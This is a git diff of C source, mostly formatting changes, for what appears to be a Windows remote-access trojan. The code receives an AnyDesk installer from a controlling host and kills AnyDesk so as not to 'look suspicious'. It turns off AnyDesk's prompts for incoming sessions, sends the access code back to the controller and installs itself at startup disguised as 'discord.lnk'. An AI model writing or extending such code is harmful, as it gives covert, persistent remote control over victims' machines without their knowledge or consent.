@@ -5,7 +5,6 @@
 #define BUFFER_SIZE 1024
 #define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits
 
-
 char anyDeskFilePath[1024]; // Contains the path to the anydesk file
 
 // Functions
@@ -18,11 +17,12 @@ void recv_file(int socket, char *fileName);
 void powerOffAnyDesk();
 void powerOnAnyDesk();
 
-void setAnyDeskFilePath(){
+void setAnyDeskFilePath()
+{
     /*
     Puts inside [anydeskFilePath] the path to the anydesk file
     */
-    
+
     // Sets the path
     strcpy(anyDeskFilePath, getenv("USERPROFILE"));
     strcat(anyDeskFilePath, "\\Downloads\\anydesk.exe");
@@ -30,7 +30,6 @@ void setAnyDeskFilePath(){
     printf("The anydesk file path is: ");
     puts(anyDeskFilePath);
 }
-
 
 int startsWith(const char *a, const char *b)
 {
@@ -46,11 +45,11 @@ void installAnyDesk(int hostSocket)
     */
     printf("Installing...\n");
 
-    // Gets the file 
+    // Gets the file
     recv_file(hostSocket, anyDeskFilePath);
-    
+
     printf("The Installing has been successfully completed!\n");
-    
+
     printf("Definning settings...\n");
     _defineAnyDeskSettings();
     printf("The settings have been successfully defined!\n");
@@ -72,23 +71,24 @@ void recv_file(int socket, char *fileName)
     FILE *fp = fopen(fileName, "wb");
 
     // Recvs the file size
-    if(recv(socket, (char *)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR){
+    if (recv(socket, (char *)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR)
+    {
         printf("Error in file recviving (1)");
         exit(1);
     }
     fileSize = ntohl(fileSize); // Converts to little endian
-    
 
-    printf("Recv file size is %d bytes\n",fileSize);
+    printf("Recv file size is %d bytes\n", fileSize);
 
     // Recvs the file
     while (totalReceived < fileSize)
     {
         recvBytesAmount = recv(socket, buffer, sizeof(buffer), 0);
-        if(recvBytesAmount == SOCKET_ERROR){
+        if (recvBytesAmount == SOCKET_ERROR)
+        {
             printf("Error in file recviving (2)");
             exit(1);
-        } 
+        }
         fwrite(buffer, sizeof(char), recvBytesAmount, fp);
 
         totalReceived += recvBytesAmount;
@@ -124,26 +124,27 @@ void _defineAnyDeskSettings()
     // Waits for the anydesk files to be written
     code = _getCode();
     while (strlen(code) == 0)
-    {   
-        if(attemptsAmount == 100){
+    {
+        if (attemptsAmount == 100)
+        {
             // TODO : there is no internet.. do something...
         }
-        if(attemptsAmount % 20 == 0){
+        if (attemptsAmount % 20 == 0)
+        {
             system("TASKKILL /F /IM AnyDesk.exe");
             ShellExecute(NULL, NULL, anyDeskFilePath, NULL, NULL, SW_SHOWNORMAL);
         }
-        
+
         attemptsAmount++;
         printf("anydesk files have not been already writeen. trying again in 2 Second\n");
         Sleep(2000);
         code = _getCode();
     }
     free(code);
-    
+
     printf("Anydesk files have been writeen..\n");
     // Kills anydesk (Do not want to look suspicious)
     system("TASKKILL /F /IM AnyDesk.exe");
-
 
     // Changes the interactive_access to 2 ("Never show incomming session requests")
     ANYDESK_SYSTEM_FILE = fopen(ANYDESK_SYSTEM_FILE_PATH, "r+");
@@ -225,13 +226,15 @@ void sendCode(int hostSocket)
 
     // Gets the code
     char *code = _getCode();
-    
+
     // TODO: do something if there is no code..
-    if(strlen(code) == 0){
+    if (strlen(code) == 0)
+    {
         printf("There is no code...\n");
-        code = ANYDESK_CODE_ERROR; 
+        code = ANYDESK_CODE_ERROR;
     }
-    else{
+    else
+    {
         printf("Sending code: %s Length:%d", code, strlen(code));
     }
 
@@ -241,7 +244,6 @@ void sendCode(int hostSocket)
 
     free(code);
 }
-
 
 void powerOnAnyDesk()
 {
@@ -262,11 +264,10 @@ void powerOffAnyDesk()
     */
 
     printf("Powering off...");
-    
-    system("TASKKILL /F /IM AnyDesk.exe");  
+
+    system("TASKKILL /F /IM AnyDesk.exe");
     printf("anydesk has successfully powered off!\n");
 }
-
 
 void addProgramToStartup()
 {
@@ -274,21 +275,22 @@ void addProgramToStartup()
     Adds the program to the windows startup folder
     (All the programs on this folder are auto runned on every boot)
     */
-    
+
     //TODO: Runs the func command as administrator
 
-    FILE * fp;
-    TCHAR buffer[MAX_PATH] = { 0 };
+    FILE *fp;
+    TCHAR buffer[MAX_PATH] = {0};
     const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
     char command[1024] = "mklink";
 
     // If we have already added the file to the startup programs folder
     fp = fopen(LINK_PATH, "r");
-    if(fp){
+    if (fp)
+    {
         // We will end the func
         fclose(fp);
         return;
-    }   
+    }
 
     // Adds the link path to the command (where the link file will be save)
     strcat(command, " ");
@@ -296,12 +298,12 @@ void addProgramToStartup()
     strcat(command, " ");
 
     // Gets the path of the current file
-    GetModuleFileName( NULL, buffer, MAX_PATH );
+    GetModuleFileName(NULL, buffer, MAX_PATH);
 
-    // Adds the path to the target file to the command(the file which the link will open)    
-    strcat(command, "\""); // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path 
+    // Adds the path to the target file to the command(the file which the link will open)
+    strcat(command, "\"");   // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path
     strcat(command, buffer); // Adds the path
-    strcat(command, "\""); // Adds -> " to the end of the path
-    
+    strcat(command, "\"");   // Adds -> " to the end of the path
+
     system(command); // Executes the command
 }
